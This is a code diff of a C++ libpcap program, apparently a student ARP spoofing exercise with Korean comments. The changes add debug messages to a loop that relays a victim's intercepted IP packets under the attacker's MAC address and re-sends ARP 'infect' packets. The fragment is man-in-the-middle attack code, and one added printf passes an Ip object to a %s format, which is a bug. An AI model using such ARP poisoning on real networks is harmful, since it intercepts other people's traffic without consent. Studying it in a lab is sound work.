@@ -48,6 +48,8 @@ int main(int argc, char* argv[]) {
     Mac myMac = Mac(myMacStr);
     Ip myIp = Ip(myIpStr);
     
+    // 공격 준비
+
     Ip senderIp = Ip(argv[2]);
     Ip targetIp = Ip(argv[3]);
     
@@ -134,7 +136,12 @@ int main(int argc, char* argv[]) {
         struct pcap_pkthdr* header;
         const  u_char*      packet;
         int res = pcap_next_ex(handle, &header, &packet);
-        if (res == 0) continue;
+        if (res == 0)
+        {
+            printf("nothing captured...\n");
+            continue;
+        }
+
         if (res == -1 || res == -2) {
             printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
             break;
@@ -146,10 +153,12 @@ int main(int argc, char* argv[]) {
 
         if(spoofedPacket->smac() != senderMac)
             continue;  // sender의 MAC이 아니면 건너뛴다!
-        
+
         // IP패킷이면 Relay!!
         if(spoofedPacket->type() == EthHdr::Ip4)
         {
+            printf("from %s, spoofed IP packet is captured: %u bytes \n", targetIp, spoofedPacketSize);
+
             // src mac을 나의 MAC으로 바꾼다.
             spoofedPacket->smac_ = myMac;
 
@@ -161,7 +170,7 @@ int main(int argc, char* argv[]) {
         }
 
         // ARP패킷이면
-        if(spoofedPacket->type() == EthHdr::Arp)
+        else if(spoofedPacket->type() == EthHdr::Arp)
         {
             // 다시한번 ARP infect 패킷 전송
             res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&arpInfectPacket), sizeof(EthArpPacket));
